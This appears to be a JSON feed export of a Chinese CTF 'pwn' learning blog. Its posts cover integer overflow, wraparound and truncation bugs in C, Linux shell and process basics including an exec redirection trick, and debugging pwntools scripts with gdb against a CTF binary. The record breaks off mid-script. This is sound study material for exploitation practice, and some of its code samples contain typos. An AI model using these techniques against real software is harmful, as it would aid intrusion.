{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"二进制\" tag",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/25/pwn/%E4%B8%93%E6%A0%8F/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/",
            "url": "https://vvwwvv.cn/2023/09/25/pwn/%E4%B8%93%E6%A0%8F/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/",
            "title": "整数安全漏洞",
            "date_published": "2023-09-25T12:15:56.000Z",
            "content_html": "<p>内容参考了《CTF 竞赛权威指南 Pwn 篇》</p>\n<h1 id=\"一-计算机中的整数\"><a class=\"anchor\" href=\"#一-计算机中的整数\">#</a> 一、计算机中的整数</h1>\n<p>计算机中整数通常分为两种，一种为有符号整数，另一种为无符号整数</p>\n<p>c 数据类型</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//32 位                      最小值～最大值  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">signed</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">char</span>            <span class=\"token operator\">-</span><span class=\"token number\">128</span>                             <span class=\"token operator\">~</span>                    <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>          <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">short</span>                           <span class=\"token operator\">-</span><span class=\"token number\">32</span>  <span class=\"token number\">768</span>                       <span class=\"token operator\">~</span>                    <span class=\"token number\">32</span>  <span class=\"token number\">767</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span>        <span class=\"token number\">0</span>                                    <span class=\"token operator\">~</span>                    <span class=\"token number\">65</span>  <span class=\"token number\">535</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span>                                <span class=\"token operator\">-</span><span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">648</span>       <span class=\"token operator\">~</span>                    <span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">unsigned</span>                    <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                    <span class=\"token number\">4</span>  <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">long</span>                             <span class=\"token operator\">-</span><span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">648</span>      <span class=\"token operator\">~</span>                    <span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>           <span class=\"token number\">0</span>                                  <span class=\"token operator\">~</span>                    <span class=\"token number\">4</span> <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//64 位</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">signed</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">char</span>            <span class=\"token operator\">-</span><span class=\"token number\">128</span>                             <span class=\"token operator\">~</span>                     <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>           <span class=\"token number\">0</span>                                  <span class=\"token operator\">~</span>                     <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">short</span>                            <span class=\"token operator\">-</span><span class=\"token number\">32</span>  <span class=\"token number\">768</span>                      <span class=\"token operator\">~</span>                     <span class=\"token number\">32</span> <span class=\"token number\">767</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span>         <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">65</span> <span class=\"token number\">535</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span>                                  <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token number\">147</span> <span class=\"token number\">483</span> <span class=\"token number\">648</span>        <span class=\"token operator\">~</span>                     <span class=\"token number\">2</span> <span class=\"token number\">147</span> <span class=\"token number\">483</span> <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">unsigned</span>                    <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">4</span>  <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">long</span>                              <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token number\">223</span>  <span class=\"token number\">372</span>  <span class=\"token number\">036</span>  <span class=\"token number\">854</span>  <span class=\"token number\">775</span>  <span class=\"token number\">808</span> <span class=\"token operator\">~</span> <span class=\"token number\">9</span> <span class=\"token number\">223</span> <span class=\"token number\">372</span> <span class=\"token number\">036</span> <span class=\"token number\">854</span> <span class=\"token number\">775</span>  <span class=\"token number\">807</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>          <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                      <span class=\"token number\">18</span> <span class=\"token number\">446</span> <span class=\"token number\">744</span> <span class=\"token number\">073</span>  <span class=\"token number\">709</span>  <span class=\"token number\">551</span> <span class=\"token number\">615</span></pre></td></tr></table></figure><h1 id=\"二-整数安全漏洞\"><a class=\"anchor\" href=\"#二-整数安全漏洞\">#</a> 二、整数安全漏洞</h1>\n<p>整数的异常情况通常有三种， <code>溢出</code> ； <code>回绕</code> ； <code>截断</code></p>\n<h2 id=\"1溢出\"><a class=\"anchor\" href=\"#1溢出\">#</a> 1. 溢出</h2>\n<p>只有 <code>有符号数</code> 才会发生溢出，我们知道，一般计算机中，有符号数的 <code>最高位</code> 代表着 <code>符号位</code> ，用来表示一个数正负，通过两个正数相加或者两个负数相减，进位时使得符号位发生变化，这样就导致了溢出</p>\n<p>有符号整数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>max_int <span class=\"token punctuation\">;</span> <span class=\"token comment\">// i=2 147 483 647</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">//  i= -2 147 483 648   ，此时会导致上溢出，改变符号位</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span>min_int  <span class=\"token punctuation\">;</span> <span class=\"token comment\">// j= -2 147 483 648</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>j<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">//j=   2 147 483 647      下溢出</span></pre></td></tr></table></figure><h2 id=\"2-回绕\"><a class=\"anchor\" href=\"#2-回绕\">#</a> 2. 回绕</h2>\n<p>无符号的数永远不会溢出，当它达到最大值的时候会回到最小值【并且由上面可以看见，无符号数最小值都为 <code>0</code> 】，因此一个无符号的整数表达式永远也不会得到小于 0 的值</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>unsign_max_int<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//  i=4  294  967  295 (x86-32,x64-64 相同)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                                                        <span class=\"token comment\">//  i=0;  产生回绕</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span>unsign_min_int <span class=\"token punctuation\">;</span>  <span class=\"token comment\">//  j=0;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>j<span class=\"token operator\">--</span> <span class=\"token punctuation\">;</span>                                                        <span class=\"token comment\">//  j=4  294  967  295</span></pre></td></tr></table></figure><h2 id=\"3截断\"><a class=\"anchor\" href=\"#3截断\">#</a> 3. 截断</h2>\n<p>将一个较大宽度的数存入一个宽度较小的操作数中，导致 <code>高位</code> 发生截断</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0xffff</span> ffff  <span class=\"token operator\">+</span>  <span class=\"token number\">0x0000</span> <span class=\"token number\">0001</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">=</span><span class=\"token number\">0</span>x <span class=\"token number\">0000</span> <span class=\"token number\">0001</span> <span class=\"token number\">0000</span> <span class=\"token number\">0000</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">=</span><span class=\"token number\">0</span>x <span class=\"token number\">0000</span> <span class=\"token number\">0000</span>   <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 这里高位就发生了截断，只保留了低位</span></pre></td></tr></table></figure><p>在整数转换中：</p>\n<p>整数转换是一种用与表示 <code>赋值</code> 、 <code>强制类型转换</code> 、或者 <code>计算结果</code> 值的底层数据类型的转变 (比如出现小数)。当一个宽度类型转向一个更大的宽度类型，往往会保留 <code>数学值</code> ，而反过来就会导致高位丢失。例如把一个 <code>unsigned char</code>  加到一个  <code>sign char</code>  上（高位符号损失）。总的来说会产生两种错误：第一损失值，当宽度转到更小的宽度的类型时会 <code>损失值</code> ；第二损失符号，从 <code>有符号类型转</code> 为 <code>无符号类型</code> 时会损失符号</p>\n<p>整型提升是指当表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> l<span class=\"token operator\">=</span><span class=\"token number\">0xabcddcba</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">short</span> s<span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> c<span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 宽度溢出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n ”, l , sizeof(l)*8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n \"</span> <span class=\"token punctuation\">,</span> s <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n  \"</span><span class=\"token punctuation\">,</span> c <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 整型提升</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"s+c =0x%x  (%d bits) \\n \"</span> <span class=\"token punctuation\">,</span> s<span class=\"token operator\">+</span>c <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">+</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 输出结果：</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>l<span class=\"token operator\">=</span><span class=\"token number\">0xabcd</span> <span class=\"token function\">dcba</span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token operator\">=</span> <span class=\"token number\">0xffff</span>  <span class=\"token function\">dcba</span>   <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">0xffff</span>   <span class=\"token function\">ffba</span>     <span class=\"token punctuation\">(</span><span class=\"token number\">8</span>bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>s<span class=\"token operator\">+</span>c<span class=\"token operator\">=</span><span class=\"token number\">0xffff</span> <span class=\"token function\">dc74</span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> bits<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3漏洞多发函数\"><a class=\"anchor\" href=\"#3漏洞多发函数\">#</a> 3. 漏洞多发函数</h1>\n<p>整数溢出往往配合着其他类型的缺陷才能有用， <code>size_t</code>  类型的参数（size_t 是 <code>无符号整数类型</code> 的 sizeof（）的结果，会将别的数转化为无符号整型）,  常常被误用而产生整数溢出，然后可能导致缓冲区溢出</p>\n<h2 id=\"1memcpy\"><a class=\"anchor\" href=\"#1memcpy\">#</a> 1.memcpy</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">,</span>size t_n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>memcpy () 函数将 src 所指向的字符串中以 <code>src地址</code> 开始的 <code>前n个字节</code> 复制到 dest 所指的数组中，并返回 <code>dest</code> 。</p>\n<h2 id=\"2strncpy\"><a class=\"anchor\" href=\"#2strncpy\">#</a> 2.strncpy</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">,</span><span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>srncpy () 函数从源 <code>src</code>  所指的内存地址的起始位置开始复制 n 个字节到目标 dest 所指的 <code>内存地址</code> 的起始位置中</p>\n<h2 id=\"上面两个函数都有一个类型为-size_t-的参数它是无符号整型的sizeof运算符的结果\"><a class=\"anchor\" href=\"#上面两个函数都有一个类型为-size_t-的参数它是无符号整型的sizeof运算符的结果\">#</a> 上面两个函数都有一个类型为 size_t 的参数，它是无符号整型的 sizeof 运算符的结果。</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token class-name\">size_t</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "url": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "title": "Linux命令和函数",
            "date_published": "2023-09-19T12:05:56.000Z",
            "content_html": "<h1 id=\"1linux执行多个命令shell命令\"><a class=\"anchor\" href=\"#1linux执行多个命令shell命令\">#</a> 1.Linux 执行多个命令（shell 命令）</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#逐条执行命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#前面的成功执行后面才执行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> echoo <span class=\"token number\">2</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span> <span class=\"token comment\">#2 出错，不会执行 echo3 ，echo4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#前一条命令失败然后才继续执行后面的命令</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\">#当第一个执行成功时，后面的就都不会执行；当第一个命令失败时，就开始执行 echo2，后面同理</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#混合使用分隔符</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># 因为 || 分隔符，按照 顺序 只要前面三个执行成功一个其他的就不执行，然后执行 echo4（因为 &amp;&amp; 前面的被看作一个整体，一个成功就视为成功，就执行 echo 4）</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<h1 id=\"2命令输出重定向\"><a class=\"anchor\" href=\"#2命令输出重定向\">#</a> 2. 命令输出重定向</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令执行结果输出到 file 中，命令的输出结果覆盖原有文件的内容（会清空旧内容）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">>></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令的输出结果输出到 file 文件的原内容的下一行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">&lt;</span>  <span class=\"token function\">file</span> <span class=\"token comment\"># 将输入重定向到 file</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1zaGVsbC1pby1yZWRpcmVjdGlvbnMuaHRtbA==\">https://www.runoob.com/linux/linux-shell-io-redirections.html</span></p>\n<h1 id=\"3fork函数\"><a class=\"anchor\" href=\"#3fork函数\">#</a> 3.fork () 函数</h1>\n<p>fork 函数用于创建一个进程，所创建的进程 <strong>复制父进程的代码段 / 数据段 / BSS 段 / 堆 / 栈等所有用户空间信息</strong> ；在内核中操作系统重新为其申请了一个 PCB，并使用父进程的 PCB 进行初始化；</p>\n<p>父进程与子进程的 pid 不同，<strong>执行顺序也不一定，要看系统的进程调度策略</strong></p>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>fork 调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<ol>\n<li>\n<pre><code>在父进程中，fork返回新创建子进程的进程ID；\n</code></pre>\n</li>\n<li>\n<pre><code>在子进程中，fork返回0；\n</code></pre>\n</li>\n<li>\n<p>如果出现错误，fork 返回一个负值；</p>\n<p>子进程的 fork（）返回值为 0  #第一次返回（不分先后，第一次返回也可能是父进程的 fork）<br />\n父进程的 fork（）返回值为子进程的 pid  #第二次返回</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nja2x1di9hcnRpY2xlL2RldGFpbHMvMTA5MTY5OTQx\">https://blog.csdn.net/cckluv/article/details/109169941</span></p>\n<h1 id=\"4linux下的exec命令\"><a class=\"anchor\" href=\"#4linux下的exec命令\">#</a> 4.Linux 下的 exec 命令</h1>\n<ol>\n<li>在一个 shell 里面，执行 <code>exec ls；</code> 那么，当列出了当前目录后，这个 shell 就自己退出了，因为这个 <code>shell进程已被替换为仅仅执行ls命令的一个进程</code> ，执行结束自然也就退出了 。</li>\n<li>exec 文件重定向，可以将文件的重定向就看为是 shell 程序的文件重定向， <code>当exec命令来对文件描述符操作的时候，就不会替换shell，而且操作完成后，还会继续执行接下来的命令。</code></li>\n</ol>\n<p>应用：可以 <code>重新开启标准输出流</code> ：</p>\n<p><code>exec （cat [文件名]）1&gt;&amp;0</code> , 使文件的标准输出流到标准输入里 (在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYnVsaC9hcnRpY2xlcy8xMjc2MDYxNy5odG1s\">https://www.cnblogs.com/bulh/articles/12760617.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMTg2MTIzL2FydGljbGUvZGV0YWlscy84MjE5MDc3Ng==\">https://blog.csdn.net/qq_31186123/article/details/82190776</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "url": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "title": "gdb本地调试，基于pwndbg",
            "date_published": "2023-09-18T11:53:15.000Z",
            "content_html": "<h1 id=\"此处用于记录在编写脚本中对程序的调试\"><a class=\"anchor\" href=\"#此处用于记录在编写脚本中对程序的调试\">#</a> 此处用于记录在编写脚本中对程序的调试</h1>\n<p>因为有时要输入不可见字符，导致我们没办法进行直接在 gdb 内调试，所以需要相应的在脚本中调试</p>\n<h2 id=\"1调试方法\"><a class=\"anchor\" href=\"#1调试方法\">#</a> 1. 调试方法：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">\"b *断点地址\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第一个 pause</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第二个 pause</span></pre></td></tr></table></figure><p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause()</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<h2 id=\"2调试例子\"><a class=\"anchor\" href=\"#2调试例子\">#</a> 2. 调试例子：</h2>\n<p>左边为新终端，右边为旧终端（pid 相同）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tKjP.png\" alt=\"\" /><br />\n此时已经在代码里设置好了断点，在新终端内输入 <code>c</code> , 旧终端按回车即可</p>\n<p>可以看到已经发送了 <code>payload</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tt9s.png\" alt=\"\" /></p>\n<p>可以看到已经发送的内容到了栈上<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4NGqK.png\" alt=\"\" /><br />\n (输入的值是 crashme，由于是小端序所以要倒着读，c 是 63，r 是 72，所以输入的位置是 0x22)</p>\n<p>上述例子具体的代码：</p>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: 